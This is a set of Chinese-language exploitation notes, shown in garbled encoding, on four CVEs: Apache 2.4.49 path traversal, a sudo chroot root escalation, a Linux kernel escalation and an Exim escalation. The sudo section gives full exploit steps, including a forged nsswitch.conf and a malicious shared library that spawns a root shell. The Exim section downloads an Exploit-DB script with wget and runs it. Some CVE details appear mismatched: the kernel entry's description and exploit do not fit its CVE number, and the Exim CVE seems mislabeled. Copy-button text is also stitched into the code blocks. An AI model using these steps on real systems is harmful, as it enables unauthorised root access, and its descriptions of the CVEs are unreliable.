## ==CVE-2021-41773==

 æ˜¯ä¸€ä¸ªé«˜å±çš„è·¯å¾„éå†å’Œæ–‡ä»¶æ³„éœ²æ¼æ´ï¼Œå½±å“ **Apache HTTP Server 2.4.49 ç‰ˆæœ¬**ã€‚

------



### æ¼æ´æ¦‚è¿°



- **æ¼æ´ç±»å‹ï¼š** è·¯å¾„éå†ï¼ˆCWE-22ï¼‰å’Œæ–‡ä»¶æ³„éœ²ã€‚åœ¨æŸäº›é…ç½®ä¸‹ï¼Œå®ƒè¿˜å¯èƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰ã€‚
- **å—å½±å“ç‰ˆæœ¬ï¼š** Apache HTTP Server 2.4.49ã€‚
- **æˆå› ï¼š** Apache HTTP Server 2.4.49 ä¸­è·¯å¾„è§„èŒƒåŒ–è¿‡ç¨‹çš„ç¼ºé™·å…è®¸æ”»å‡»è€…åˆ©ç”¨è·¯å¾„éå†æ”»å‡»ï¼ˆä¾‹å¦‚ï¼Œä½¿ç”¨ `../` æˆ–å…¶ URL ç¼–ç çš„ç­‰æ•ˆå½¢å¼ `.%2e/`ï¼‰å°† URL æ˜ å°„åˆ° Alias ç±»æŒ‡ä»¤é…ç½®ç›®å½•ä¹‹å¤–çš„æ–‡ä»¶ã€‚
- **å½±å“ï¼š**
  - **æ–‡ä»¶æ³„éœ²ï¼š** æ”»å‡»è€…å¯ä»¥æœªç»æˆæƒåœ°è®¿é—®æœåŠ¡å™¨ä¸Šçš„æ•æ„Ÿæ–‡ä»¶ï¼ˆä¾‹å¦‚ `/etc/passwd`ï¼‰ã€‚
  - **è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)ï¼š** å¦‚æœé…ç½®ç›®å½•ä¹‹å¤–çš„æ–‡ä»¶æ²¡æœ‰å—åˆ°é»˜è®¤çš„ "require all denied" é…ç½®ä¿æŠ¤ï¼Œå¹¶ä¸”è¿™äº›åˆ«åè·¯å¾„å¯ç”¨äº† CGI è„šæœ¬ï¼Œæ”»å‡»è€…å°±å¯ä»¥åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚
- **åˆ©ç”¨æƒ…å†µï¼š** è¯¥æ¼æ´åœ¨å‘ç°åä¸ä¹…å°±å·²è¢«ç§¯æåˆ©ç”¨ã€‚å…¬å¼€çš„æ¦‚å¿µéªŒè¯ï¼ˆPoCï¼‰æ¼æ´åˆ©ç”¨ä»£ç ä¹Ÿå¹¿æ³›å¯ç”¨ã€‚

------



### ä¿®å¤ä¸ç¼“è§£



- **ä¿®å¤ç‰ˆæœ¬ï¼š** Apache åœ¨ **Apache HTTP Server 2.4.50** ä¸­å‘å¸ƒäº†ä¿®å¤ç¨‹åºã€‚ç„¶è€Œï¼Œæ­¤ä¿®å¤è¢«å‘ç°ä¸å®Œæ•´ï¼Œåæ¥è¢«å•ç‹¬è·Ÿè¸ªä¸ºå¦ä¸€ä¸ªæ¼æ´ **CVE-2021-42013**ï¼Œè¯¥æ¼æ´ä¹Ÿå…è®¸è·¯å¾„éå†å’Œ RCEã€‚é’ˆå¯¹ CVE-2021-41773 å’Œ CVE-2021-42013 çš„å®Œæ•´ä¿®å¤å·²åœ¨ **Apache HTTP Server 2.4.51** ä¸­å‘å¸ƒã€‚
- **ç¼“è§£æªæ–½ï¼š**
  - ä¸»è¦å»ºè®®æ˜¯**å°† Apache HTTP Server æ›´æ–°åˆ° 2.4.51 æˆ–æ›´é«˜ç‰ˆæœ¬**ã€‚
  - å¦‚æœæ— æ³•ç«‹å³æ›´æ–°ï¼Œè¯·ç¡®ä¿æ‰€æœ‰ä¸æ‰“ç®—å…¬å¼€è®¿é—®çš„ç›®å½•éƒ½å®æ–½äº† `Require all denied` æŒ‡ä»¤ã€‚è¿™åº”åº”ç”¨äºæ‰€æœ‰ç›®å½•ï¼Œå¹¶ä¸”**ç»ä¸èƒ½**åœ¨æ²¡æœ‰é€‚å½“é™åˆ¶çš„æƒ…å†µä¸‹åº”ç”¨äºæ ¹ç›®å½•ã€‚
  - å¦‚æœ `mod_cgi` æ¨¡å—å¯¹äºä¸šåŠ¡è¿è¥å¹¶éå¿…ä¸å¯å°‘ï¼Œè¯·ç¦ç”¨å®ƒï¼Œå› ä¸ºå®ƒçš„å¯ç”¨å¯èƒ½ä¼šå°†æ¼æ´å‡çº§ä¸º RCEã€‚
  - è€ƒè™‘ä½¿ç”¨ Web åº”ç”¨ç¨‹åºé˜²ç«å¢™ï¼ˆWAFï¼‰æ¥å¸®åŠ©æ£€æµ‹å’Œé˜»æ­¢åˆ©ç”¨å°è¯•ã€‚





# ğŸ” CVE-2025-32463 - Sudo æœ¬åœ°ææƒæ¼æ´ï¼ˆchroot ç»•è¿‡ï¼‰

---

## ğŸŒ æ¼æ´ç¼–å· / CVE ID

- CVE-2025-32463

---

## ğŸ§© æ¼æ´ç±»å‹ / Vulnerability Type

- æœ¬åœ°ææƒ / Local Privilege Escalation (LPE)

---

## ğŸ“… æŠ«éœ²æ—¶é—´ / Disclosure Date

- 2025 å¹´ 6 æœˆåº•ï¼ˆåœ¨ sudo 1.9.17p1 ä¸­ä¿®å¤ï¼‰

---

## ğŸ’¥ æ¼æ´å½±å“ / Affected Versions

- Sudo 1.9.14 ~ 1.9.17  
- å« Ubuntu / Fedora / RHEL / macOS Sequoiaï¼ˆé»˜è®¤ç¯å¢ƒï¼‰

---

## âš ï¸ å±å®³ç­‰çº§ / Severity

- CVSS è¯„åˆ†ï¼š9.3ï¼ˆCriticalï¼‰

---

## ğŸ§ª æ¼æ´ç®€è¿° / Vulnerability Summary

> è¯¥æ¼æ´åˆ©ç”¨äº† `sudo` çš„ `-R` æˆ– `--chroot` å‚æ•°ï¼Œåœ¨åˆ‡æ¢æ ¹ç›®å½•åè§£æ `/etc/nsswitch.conf` æ—¶ï¼Œä¼šåŠ è½½æ”»å‡»è€…æ§åˆ¶çš„ NSS æ¨¡å—ï¼ˆå¦‚ `libnss_xxx.so.2`ï¼‰ï¼Œæœ€ç»ˆå¯¼è‡´æ‰§è¡Œæ¶æ„å…±äº«åº“ä¸­çš„æ„é€ å‡½æ•°ï¼Œä»è€Œå®ç°æœ¬åœ°ææƒã€‚

> This vulnerability leverages the fact that when using `sudo -R` to enter a chroot environment, sudo will parse `nsswitch.conf` from the new root and load potentially malicious `libnss_xxx.so.2` libraries, allowing local attackers to execute arbitrary code as root.

---

## ğŸ§  æ¼æ´åŸç† / Root Cause

1. ç”¨æˆ·å¯ä»¥ä½¿ç”¨ `sudo -R /some/dir command` è¿›å…¥ä»»æ„ chrootï¼›
2. åœ¨è¯¥ chroot ç¯å¢ƒä¸‹ï¼ˆæ”»å‡»è€…å¯æ§ï¼‰ï¼Œå¯ä¼ªé€  `/etc/nsswitch.conf` æ–‡ä»¶ï¼›
3. æŒ‡å®šè‡ªå®šä¹‰ NSS æ¨¡å—åï¼Œä¾‹å¦‚ï¼š
   ```text
   passwd: files myhack

1. ç³»ç»Ÿä¼šå°è¯•åŠ è½½ `libnss_myhack.so.2`ï¼›

2. æ¶æ„å…±äº«åº“ä¸­å¯åŒ…å«å¦‚ä¸‹æ„é€ å‡½æ•°ï¼š

   ```apl
   __attribute__((constructor)) void init() {
       setuid(0); setgid(0);
       system("/bin/bash");
   }
   ```

3. åŠ è½½æ—¶è‡ªåŠ¨æ‰§è¡Œï¼Œè·å– root shellã€‚

------

## ğŸ§° åˆ©ç”¨æ¡ä»¶ / Exploitation Conditions

- æ”»å‡»è€…èƒ½å†™å…¥æŸä¸ªç›®å½•å¹¶æ‰§è¡Œ `sudo -R`ï¼›
- sudo æœªæ‰“è¡¥ä¸ï¼Œä»ä¸ºå—å½±å“ç‰ˆæœ¬ï¼›
- ç³»ç»Ÿæ”¯æŒåŠ¨æ€åŠ è½½ NSS æ¨¡å—ã€‚

------

## ğŸ”§ åˆ©ç”¨æ­¥éª¤ / Exploit Steps

```apl
# Step 1 - åˆ›å»ºä¼ªé€ ç›®å½•ç»“æ„
mkdir -p /tmp/chroot/etc /tmp/chroot/lib

# Step 2 - ç¼–å†™ä¼ªé€  nsswitch.conf
echo "passwd: files myhack" > /tmp/chroot/etc/nsswitch.conf

# Step 3 - ç¼–å†™å¹¶ç¼–è¯‘æ¶æ„å…±äº«åº“
cat << EOF > myhack.c
#include <unistd.h>
#include <stdlib.h>
__attribute__((constructor)) void init() {
    setuid(0); setgid(0);
    system("/bin/bash");
}
EOF

gcc -shared -fPIC -o /tmp/chroot/lib/libnss_myhack.so.2 myhack.c

# Step 4 - è§¦å‘ sudo chroot ææƒ
sudo -R /tmp/chroot id   # æˆ– sudo -R /tmp/chroot /bin/bash
```

æ‰§è¡ŒæˆåŠŸåï¼Œå³å¯è·å– root shellã€‚

------

## ğŸ”’ ä¿®å¤æ–¹æ¡ˆ / Mitigation

- å°† sudo å‡çº§è‡³ **1.9.17p1 æˆ–æ›´é«˜ç‰ˆæœ¬**ï¼›
- ç¦æ­¢æ™®é€šç”¨æˆ·æ‰§è¡Œ `sudo -R` æˆ–é™åˆ¶å¯è®¿é—®çš„ chroot è·¯å¾„ï¼›
- åŠ å¼º NSS æ¨¡å—çš„åŠ è½½è·¯å¾„æ ¡éªŒã€‚

------

## 

# ğŸ›¡ï¸ CVE-2017-16995 - Linux Kernel (Ubuntu 16.04) Local Privilege Escalation

## ğŸ§¾ æ¼æ´ç¼–å·
**CVE-2017-16995**

## ğŸ“… æŠ«éœ²æ—¶é—´
2017å¹´12æœˆ

## ğŸ§  æ¼æ´ç±»å‹
æœ¬åœ°ææƒï¼ˆLocal Privilege Escalationï¼‰

## ğŸ§¬ å½±å“èŒƒå›´
- Linux Kernel ç‰ˆæœ¬ï¼š**< 4.14.8**
- Ubuntu 16.04ï¼ˆé»˜è®¤å®‰è£…ï¼‰å—å½±å“
- å…¶ä»–ä½¿ç”¨ `AF_PACKET` å¥—æ¥å­—ä¸ `user namespace` çš„ Linux å‘è¡Œç‰ˆä¹Ÿå—å½±å“

---

## ğŸ” æ¼æ´æè¿°

è¯¥æ¼æ´æºäº Linux kernel ä¸­ `net/packet/af_packet.c` ä¸­å¯¹ packet socket çš„å¤„ç†ä¸å½“ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ ç‰¹å®šçš„æ•°æ®åŒ…å¹¶ç»“åˆ **user namespaces**ï¼Œå®ç°å¯¹å†…æ ¸å†…å­˜çš„ä»»æ„è¯»å†™ï¼Œæœ€ç»ˆææƒè‡³ rootã€‚

è¿™å…è®¸ä¸€ä¸ªéç‰¹æƒçš„æœ¬åœ°ç”¨æˆ·åˆ©ç”¨ socket é…ç½®ï¼Œ**è¦†ç›–å‡½æ•°æŒ‡é’ˆ**ï¼Œä»è€Œæ‰§è¡Œä»»æ„ä»£ç ã€‚

---

## ğŸ§ª åˆ©ç”¨æ¡ä»¶

- æœ¬åœ°ç”¨æˆ·è®¿é—®æƒé™ï¼ˆå·²ç™»å½•ç³»ç»Ÿï¼‰
- ç³»ç»Ÿå†…æ ¸ç‰ˆæœ¬å°äº 4.14.8
- ç³»ç»Ÿæ”¯æŒ user namespacesï¼ˆUbuntu é»˜è®¤å¼€å¯ï¼‰

---

## ğŸ› ï¸ åˆ©ç”¨æ–¹å¼

1. ä¸‹è½½å¹¶ç¼–è¯‘åˆ©ç”¨ä»£ç ï¼ˆdoubleput.cï¼‰ï¼š
   ```bash
   https://www.exploit-db.com/exploits/45010

1. æ‰§è¡Œææƒï¼š

   ```apl
   ./doubleput
   ```

2. è‹¥æˆåŠŸï¼Œ60 ç§’å†…å°†è·å¾— root shellã€‚

------

## ğŸ’¥ åˆ©ç”¨æ•ˆæœ

- é root ç”¨æˆ·å¯é€šè¿‡æ­¤æ¼æ´è·å–ç³»ç»Ÿæœ€é«˜æƒé™ï¼ˆrootï¼‰ã€‚
- å¯è¿›ä¸€æ­¥è¯»å–æ•æ„Ÿæ–‡ä»¶ã€ä¿®æ”¹ç³»ç»Ÿé…ç½®ã€æ¤å…¥åé—¨ç­‰ã€‚

------

## âœ… ä¿®å¤æ–¹å¼

- æ›´æ–°å†…æ ¸è‡³ **4.14.8 æˆ–æ›´é«˜ç‰ˆæœ¬**

- ä¸´æ—¶ç¼“è§£æªæ–½ï¼šç¦ç”¨ **unprivileged user namespaces**

  ```apl
  sudo sysctl -w kernel.unprivileged_userns_clone=0
  ```

# CVE-2019-15846 è¯¦è§£ä¸åˆ©ç”¨ç¬”è®°

------

## ğŸ“Œ æ¼æ´ç¼–å·

**CVE-2019-15846**

------

## ğŸ§© æ¼æ´ç±»å‹

**æœ¬åœ°ææƒæ¼æ´ï¼ˆLocal Privilege Escalationï¼‰**

------

## ğŸ“š æ¼æ´ç®€ä»‹

CVE-2019-15846 æ˜¯ Exim é‚®ä»¶ä¼ è¾“ä»£ç†ï¼ˆMTAï¼‰åœ¨ç‰ˆæœ¬ **4.87 è‡³ 4.91** ä¸­å­˜åœ¨çš„ä¸€ä¸ª **æœ¬åœ°ææƒæ¼æ´**ï¼Œè¯¥æ¼æ´å…è®¸å…·æœ‰æœ¬åœ° shell è®¿é—®æƒé™çš„æ”»å‡»è€…é€šè¿‡åˆ›å»ºç‰¹åˆ¶é…ç½®æ–‡ä»¶æ¥æ‰§è¡Œä»»æ„ä»£ç ï¼Œä»è€Œæå‡æƒé™è‡³ rootã€‚

------

## ğŸ› ï¸ å½±å“ç‰ˆæœ¬

- **Exim 4.87 ~ 4.91**

è¯¥æ¼æ´åœ¨ **4.92** ç‰ˆæœ¬ä¸­è¢«ä¿®å¤ã€‚

------

## ğŸ§  æ¼æ´åŸç†

Exim åœ¨å¤„ç† **EHLO/HELO** è¿‡ç¨‹ä¸­å¯¹å¤–éƒ¨ç¯å¢ƒå˜é‡å¤„ç†ä¸å½“ï¼Œæœ¬åœ°æ”»å‡»è€…å¯åˆ©ç”¨è¯¥ç¼ºé™·æ„é€ æ¶æ„çš„ Exim é…ç½®ç¯å¢ƒï¼ˆå¦‚è‡ªå®šä¹‰é…ç½®æ–‡ä»¶è·¯å¾„ã€ç¼–è¯‘è„šæœ¬ï¼‰ï¼Œå¹¶è§¦å‘é”™è¯¯é€»è¾‘ï¼Œä½¿å¾— Exim æ‰§è¡Œå…¶æ„é€ çš„ä»»æ„å‘½ä»¤ã€‚

æ”»å‡»æ­¥éª¤å¤§è‡´å¦‚ä¸‹ï¼š

1. æ”»å‡»è€…æ„é€ æ¶æ„é…ç½®æ–‡ä»¶æˆ–è„šæœ¬ï¼›
2. ä½¿ç”¨ç‰¹å®šç¯å¢ƒå˜é‡æ¬ºéª— Exim åŠ è½½æ”»å‡»è€…æ§åˆ¶çš„é…ç½®ï¼›
3. å¯¼è‡´ Exim ä»¥ root æƒé™æ‰§è¡Œæ”»å‡»è€…çš„å‘½ä»¤ã€‚

------

## ğŸ§ª åˆ©ç”¨æ¡ä»¶

- æ”»å‡»è€…å·²è·å¾— **ç›®æ ‡ä¸»æœº shell æƒé™ï¼ˆä½æƒé™ç”¨æˆ·ï¼‰**
- ç³»ç»Ÿä¸­å®‰è£…äº†å—å½±å“ç‰ˆæœ¬çš„ Exim
- æœ¬åœ°æœ‰ Exim æ‰§è¡Œæƒé™ï¼ˆé€šå¸¸ä¸º `/usr/sbin/exim` æˆ– `/usr/sbin/exim4`ï¼‰

------

## âš™ï¸ åˆ©ç”¨æµç¨‹ï¼ˆå®æˆ˜æ¼”ç¤ºï¼‰

ä»¥æ¼æ´é¶åœº DC-4 ä¸ºä¾‹ï¼š

### ğŸ” æ­¥éª¤ 1ï¼šç¡®è®¤ç‰ˆæœ¬

```
bash


å¤åˆ¶ç¼–è¾‘
/usr/sbin/exim4 --version
```

ç¡®è®¤ç‰ˆæœ¬åœ¨ 4.87 ~ 4.91 èŒƒå›´å†…ã€‚

------

### ğŸ”§ æ­¥éª¤ 2ï¼šä¸‹è½½ Exploit è„šæœ¬

å¯ä½¿ç”¨ä»¥ä¸‹ Exploit-DB æä¾›çš„ææƒè„šæœ¬ï¼š

```
bash


å¤åˆ¶ç¼–è¾‘
wget https://www.exploit-db.com/raw/46996 -O exim_poc.sh
chmod +x exim_poc.sh
```

------

### ğŸš€ æ­¥éª¤ 3ï¼šè¿è¡Œ Exploit

```
bash


å¤åˆ¶ç¼–è¾‘
./exim_poc.sh
```

è„šæœ¬ä¼šå°è¯•æ„é€ åˆ©ç”¨ç¯å¢ƒå¹¶æ‰§è¡Œç‰¹å®šå‘½ä»¤ï¼ˆå¦‚å¯åŠ¨ root shellï¼‰ã€‚å¦‚æœæˆåŠŸï¼Œæ”»å‡»è€…å°†ä»¥ root èº«ä»½è·å¾—äº¤äº’å¼ shellã€‚

------

## ğŸ” æ¼æ´å±å®³

- æœ¬åœ°ç”¨æˆ·å¯è·å¾— **root æƒé™**
- å¯è¿›ä¸€æ­¥æ§åˆ¶æ•´ä¸ªç³»ç»Ÿ
- å¯ç»•è¿‡æ™®é€šæƒé™éš”ç¦»æœºåˆ¶

------

## ğŸ”§ ä¿®å¤å»ºè®®

- å‡çº§ Exim è‡³ **4.92 ä»¥ä¸Šç‰ˆæœ¬**
- å¯¹æœ¬åœ°ç”¨æˆ· shell æƒé™è¿›è¡Œæ›´ä¸¥æ ¼æ§åˆ¶
- ä½¿ç”¨ AppArmorã€SELinux ç­‰åŠ å¼ºè¿›ç¨‹éš”ç¦»

------

## ğŸ æ€»ç»“

| é¡¹ç›®         | å†…å®¹                                    |
| ------------ | --------------------------------------- |
| æ¼æ´ç¼–å·     | CVE-2019-15846                          |
| ç±»å‹         | æœ¬åœ°ææƒæ¼æ´ï¼ˆLPEï¼‰                     |
| å½±å“ç‰ˆæœ¬     | Exim 4.87 ~ 4.91                        |
| æ¼æ´åˆ©ç”¨æ¡ä»¶ | æœ¬åœ°ä½æƒé™ shellï¼ŒExim å®‰è£…å¹¶å¯æ‰§è¡Œ     |
| å±å®³         | ææƒä¸º rootï¼Œå®Œå…¨æ§åˆ¶ç³»ç»Ÿ               |
| ä¿®å¤æ–¹æ³•     | å‡çº§è‡³ Exim 4.92+ï¼Œé™åˆ¶æœ¬åœ°ç”¨æˆ·æ‰§è¡Œæƒé™ |